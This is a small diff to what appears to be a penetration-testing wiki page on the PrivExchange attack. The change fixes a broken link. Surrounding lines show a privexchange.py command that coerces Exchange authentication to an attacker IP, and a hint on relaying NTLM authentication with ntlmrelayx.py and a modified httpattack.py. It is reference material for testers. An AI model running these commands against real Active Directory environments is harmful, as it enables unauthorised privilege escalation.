@@ -13,7 +13,7 @@ privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EX
 ```
 
 {% hint style="info" %}
-In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../../../ad/movement/mitm-and-coerced-authentications/broken-reference/) to make the API call.
+In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) to make the API call.
 
 The modified [httpattack.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py) can be used with ntlmrelayx.py to perform this attack. The attacker host needs to be modified in the script since it is hard-coded.
 
